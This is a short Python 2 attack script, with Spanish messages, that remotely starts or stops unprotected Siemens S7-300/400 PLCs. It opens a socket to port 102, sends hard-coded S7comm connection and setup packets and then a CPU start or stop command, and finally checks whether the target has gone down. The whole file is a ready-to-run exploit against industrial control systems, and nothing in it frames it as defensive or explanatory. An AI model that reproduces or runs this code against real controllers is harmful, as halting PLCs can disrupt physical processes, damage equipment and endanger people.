#!/usr/bin/env python2

# Autor original:
#   wenzhe zhu <jtrkid[at]gmail.com>

import socket, argparse

setup_communication_payload = '0300001902f08032010000020000080000f0000002000201e0'.decode('hex')
cpu_start_payload = "0300002502f0803201000005000014000028000000000000fd000009505f50524f4752414d".decode('hex')
cpu_stop_payload = "0300002102f0803201000006000010000029000000000009505f50524f4752414d".decode('hex')

class Exploit:

    def __init__(self, target, port, command, slot):
        self.target = target
        self.port = port
        self.command = command
        self.slot = slot
    sock = None

    def create_connect(self, slot):
        slot_num = chr(slot)
        create_connect_payload = '0300001611e00000001400c1020100c20201'.decode('hex') + slot_num + 'c0010a'.decode('hex')
        self.sock.send(create_connect_payload)
        self.sock.recv(1024)
        self.sock.send(setup_communication_payload)
        self.sock.recv(1024)

    def exploit(self):
        self.sock = socket.socket()
        self.sock.connect((self.target, self.port))
        self.create_connect(self.slot)
        if self.command == 1:
            print("PLC Start")
            self.sock.send(cpu_start_payload)
        elif self.command == 2:
            print("PLC Stop")
            self.sock.send(cpu_stop_payload)
        else:
            print("Opcion invalida (%s) no soportada" % self.command)

    def run(self):
        if self._check_alive():
            print("Objetivo online")
            print("Enviando paquete...")
            self.exploit()
            if not self._check_alive():
                print("Objetivo caido")
        else:
            print("Objetivo no alcanzable")

    def _check_alive(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((self.target, self.port))
            sock.close()
        except Exception:
            return False
        return True


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Controlar PLCs s7-300/400 desprotegidos')
    parser.add_argument('target', type=str,
                        help='IP objetivo')
    parser.add_argument('command', type=int, choices=[1,2],
                       help='(1): plc START (2): plc STOP')
    parser.add_argument('port', type=int, default=102, nargs="?",
                        help='puerto objetivo')
    parser.add_argument('slot', type=int, default=2, nargs="?",
                        help='ranura CPU objetivo')
    args = parser.parse_args()
    exploit = Exploit(args.target, args.port, args.command, args.slot)
    exploit.run()
